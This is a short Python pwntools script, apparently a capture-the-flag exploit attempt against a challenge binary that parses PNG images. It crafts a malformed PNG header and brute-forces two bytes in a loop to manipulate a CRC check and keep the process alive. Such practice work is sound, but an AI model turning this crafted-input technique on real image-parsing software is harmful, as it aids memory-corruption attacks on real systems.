from pwn import * 
import time
context.arch='amd64'
# context.log_level='error'
# context.terminal = ['tmux', 'splitw', '-h']

# cn = remote("mc.ax", 31412)


leng = 0x29
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

data[11] = 0xd

data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

data[0x24] = 0x30 - 1 - 8


for i in range(0, 0xff):
    for j in range(0, 0xff):
        cn = process("./chal")
        cn.sendlineafter("How large is your file?\n\n", str(leng))
        # wow, this causes `updata_crc` to return 0x1818
        data[0x25] = i
        data[0x26] = j

        # data[0x28] = 0x1
        cn.sendafter("please send your image here:\n\n", bytes(data))
        cn.sendlineafter("do you want to invert the colors?\n", "y")

        time.sleep(0.5)

        print("i: " + hex(i) + "\nj: " + hex(j))

        if cn.poll() == None :
            print("!!!")
            break;
        cn.close()


